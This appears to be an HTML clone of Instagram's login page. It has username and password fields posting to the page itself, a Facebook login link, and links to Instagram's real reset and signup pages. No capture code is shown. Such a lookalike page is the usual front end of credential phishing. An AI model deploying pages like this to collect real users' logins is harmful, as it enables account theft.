<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <link rel="stylesheet" href="insta.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Instagram</h1>
            
            <form action="" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button">Log In</button>
            </form>

            <div class="divider">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>

            <div class="facebook-login">
                <img src="../Instagram/images/Facebook-icon.png" alt="Facebook Icon">
                <a href="https://www.facebook.com">Log in with Facebook</a>
            </div>

            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </div>

        <div class="signup-box">
            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
        </div>
    </div>
</body>
</html></div>
